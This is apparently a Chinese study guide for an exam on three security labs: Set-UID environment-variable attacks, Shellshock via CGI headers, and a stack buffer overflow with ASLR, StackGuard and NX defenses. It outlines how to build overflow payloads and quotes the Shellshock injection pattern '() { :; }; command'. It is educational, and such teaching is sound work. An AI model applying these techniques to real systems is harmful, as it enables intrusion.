服务器运行的 `stack.c` 中有：

```c
int bof(char *str)
{
    char buffer[BUF_SIZE];
    strcpy(buffer, str);
    return 1;
}
```

-答案：
漏洞是 `strcpy(buffer, str)` 不检查长度。如果用户输入超过 `buffer` 大小，就会覆盖栈上的 saved frame pointer 和返回地址。

-详细解释：
服务器最多接收 517 字节，但 `buffer` 比 517 小，所以输入足够长时会溢出。

-复习重点：
一句话：

```text
strcpy() 不检查目标 buffer 大小，是栈溢出的根本原因。
```

---

## 3. 必考点 2：payload 由什么组成？

典型攻击文件 `badfile` 长这样：

```text
[NOP sled][shellcode][填充][覆盖返回地址]
```

或者：

```text
[大量 NOP][shellcode][重复返回地址]
```

-答案：
payload 需要三个核心元素：

```text
1. shellcode：真正要执行的恶意代码
2. NOP sled：提高跳转命中率
3. 返回地址：覆盖原返回地址，使函数 return 时跳到 NOP sled 或 shellcode
```

-详细解释：
实验里的 `exploit.py` 框架让你修改：

```python
start = ...
ret = ...
offset = ...
```

其中：

```text
start  = shellcode 放在 payload 的哪里
ret    = 想让程序跳到的地址
offset = 返回地址在 payload 中的位置
```

实验手册提供的代码框架就是围绕这三个值构造攻击文件。

-复习重点：
老师可能让你解释：

```text
为什么 ret 不一定要精确指向 shellcode？
```

答：

```text
因为有 NOP sled。只要跳到 NOP 区域，CPU 会一路执行 NOP，最终滑到 shellcode。
```

---

## 4. 必考点 3：第一关 Level 1 怎么算？

Level 1 会显示：

```text
Frame Pointer inside bof()
Buffer's address inside bof()
```

-答案：
根据 frame pointer 和 buffer 地址计算返回地址偏移。

-详细解释：
32 位程序中：

```text
返回地址位置通常在 ebp + 4
```

所以：

```text
offset = (ebp + 4) - buffer_address
```

然后把新的返回地址写到 payload 的这个 offset 位置。

-复习重点：
32 位：

```text
return address = ebp + 4
地址占 4 字节
```

64 位：

```text
return address = rbp + 8
地址占 8 字节
```

---

## 5. 必考点 4：第二关为什么更难？

Level 2 只给 buffer 地址，不给 frame pointer，而且 buffer 大小未知，范围是 `[100, 200]`。

-答案：
因为不知道返回地址准确 offset，所以要在可能的返回地址范围内重复写入同一个目标地址。

-详细解释：
这和你前面做的 S4.14 是同一个思路：

```text
不知道返回地址具体在哪里
        ↓
找出可能范围
        ↓
在整个可能范围重复放 ret
        ↓
ret 指向后面的 NOP sled
```

-复习重点：
老师很可能考：

```text
未知 buffer size 时如何构造一次性 payload？
```

答：

```text
把所有可能的返回地址位置都填成同一个跳转地址，让它跳到大的 NOP sled。
```

---

## 6. 必考点 5：64 位为什么更难？

实验第 3 关是 64 位程序。手册指出 64 位地址最高两字节通常是 0，例如：

```text
0x00007fffffffe070
```

-答案：
因为 payload 需要通过 `strcpy()` 复制，而 64 位地址中包含 `0x00` 字节，`strcpy()` 遇到 `0x00` 会停止复制。

-详细解释：
32 位地址通常可以选不含 0 的地址。但 64 位用户态地址高位经常是：

```text
00 00
```

如果把完整 8 字节地址放进 payload 中，中途出现 0，后面的内容不会被复制，攻击失败。

-复习重点：
考试写：

```text
64 位缓冲区溢出难点之一是地址中包含 0 字节，而 strcpy() 会在 0 字节处停止。
```

---

## 7. 必考点 6：ASLR 为什么让攻击变难？

实验任务 6 重新开启 ASLR：

```bash
sudo /sbin/sysctl -w kernel.randomize_va_space=2
```

-答案：
ASLR 会让栈地址、buffer 地址、库地址随机变化，攻击者很难预测 shellcode 或 NOP sled 的地址。

-详细解释：
关闭 ASLR 时，buffer 地址稳定，可以直接计算 ret。开启 ASLR 后，每次运行地址都可能变化，所以 ret 可能跳不到 shellcode。

实验还提到 32 位随机化空间较小，可以通过反复攻击暴力尝试；64 位随机化空间更大，暴力破解更难。

-复习重点：
一句话：

```text
ASLR 不修复溢出漏洞，但让攻击者难以猜中目标地址。
```

---

## 8. 必考点 7：StackGuard 为什么有效？

实验任务 7.a 重新启用 StackGuard。

-答案：
StackGuard 会在 buffer 和返回地址之间放 canary。溢出覆盖返回地址前通常会先破坏 canary，函数返回前检测到 canary 改变，就终止程序。

-详细解释：
启用后运行溢出 payload，通常会看到类似：

```text
stack smashing detected
```

程序不会正常跳到 shellcode。

-复习重点：
一句话：

```text
StackGuard 通过 canary 检测栈溢出，阻止返回地址被悄悄覆盖。
```

---

## 9. 必考点 8：不可执行栈为什么不是万能防御？

实验任务 7.b 重新编译时不使用：

```bash
-z execstack
```

使栈不可执行。

-答案：
不可执行栈会阻止执行栈上的 shellcode，但不能阻止所有缓冲区溢出攻击。

-详细解释：
如果攻击方式是：

```text
把 shellcode 放栈上
返回地址跳到栈上 shellcode
```

那么 NX / noexecstack 会让攻击失败。

但攻击者仍可能使用：

```text
return-to-libc
ROP
```

也就是跳到已有代码，例如 `system()`，而不是执行栈上代码。实验手册也明确说明不可执行栈不能完全防止缓冲区溢出攻击，因为还有 return-to-libc 等方法。

-复习重点：
一句话：

```text
NX 防的是执行栈上代码，不防控制流劫持本身。
```

# 四、三个实验对比表

```text
实验 1：Set-UID + 环境变量
核心：用户环境变量影响高权限程序
典型攻击：PATH、LD_PRELOAD、system()、权限泄露
防御：execve()、绝对路径、过滤环境变量、关闭敏感 fd、最小权限

实验 2：Shellshock
核心：Bash 解析环境变量中的函数定义时执行额外命令
典型攻击：HTTP Header → CGI 环境变量 → 漏洞 Bash → 命令执行
防御：升级 Bash、避免漏洞 shell、限制 CGI、最小权限

实验 3：Buffer Overflow Server
核心：strcpy() 超长输入覆盖返回地址
典型攻击：payload + NOP sled + shellcode + 覆盖 ret
防御：ASLR、StackGuard、NX、边界检查、安全函数
```

# 五、老师最可能怎么考

## 题型 1：解释实验现象

例如：

```text
为什么 Set-UID 程序里 system("ls") 会执行攻击者的 ls？
```

答：

```text
因为 system() 调用 shell，shell 根据 PATH 查找 ls，而 PATH 是用户可控环境变量。
```

---

## 题型 2：比较 `system()` 和 `execve()`

必背答案：

```text
system() 会调用 shell，命令字符串会被 shell 解释，容易受 PATH 和 shell 元字符影响。
execve() 直接执行指定程序，参数以数组传递，不经过 shell，因此更安全。
```

---

## 题型 3：Shellshock 触发条件

必背答案：

```text
1. 攻击者能控制传给 Bash 的环境变量。
2. 环境变量值以函数定义形式开头：() { ...; };
3. 目标程序会启动有漏洞的 Bash。
```

---

## 题型 4：为什么 CGI 能被 Shellshock 攻击

必背答案：

```text
因为 Apache 会把 HTTP 请求头转换成环境变量传给 CGI 程序。
如果 CGI 脚本由漏洞 Bash 执行，恶意 User-Agent 等请求头就可能触发 Shellshock。
```

---

## 题型 5：Buffer Overflow payload 怎么构造

必背答案：

```text
1. 找到 buffer 地址。
2. 找到返回地址相对 buffer 的 offset。
3. 在 payload 中放 NOP sled 和 shellcode。
4. 在 offset 处写入新的返回地址。
5. 新返回地址指向 NOP sled 或 shellcode。
```

---

## 题型 6：三种防御机制比较

必背答案：

```text
ASLR：
随机化地址，让攻击者难以猜 ret。

StackGuard：
用 canary 检测返回地址是否被覆盖。

NX / noexecstack：
禁止执行栈上的 shellcode，但不能防 return-to-libc / ROP。
```

---

# 六、最后速记版

```text
Set-UID 实验：
高权限程序不能相信用户环境变量。
system() 危险，execve() 更安全。
LD_PRELOAD 对普通程序有效，对 Set-UID 通常被过滤。
降权前打开的敏感 fd 会造成权限泄露。

Shellshock 实验：
恶意 HTTP Header 进入 CGI 环境变量。
漏洞 Bash 把 () { :; }; command 后面的 command 执行。
CGI 权限通常是 www-data，所以不一定能读 /etc/shadow。
反向 shell = 把 bash 的 stdin/stdout/stderr 绑定到 TCP 连接。

Buffer Overflow Server 实验：
strcpy() 导致超长输入覆盖返回地址。
payload = NOP sled + shellcode + 新返回地址。
未知 offset 时重复填 ret。
ASLR 随机地址，StackGuard 检测 canary，NX 禁止执行栈代码。
```

你今晚重点背这三句话就够顶用：

```text
1. Set-UID：用户环境变量不能被高权限程序信任。
2. Shellshock：环境变量里的 Bash 函数定义触发命令执行。
3. Buffer Overflow：超长输入覆盖返回地址，劫持程序控制流。
```
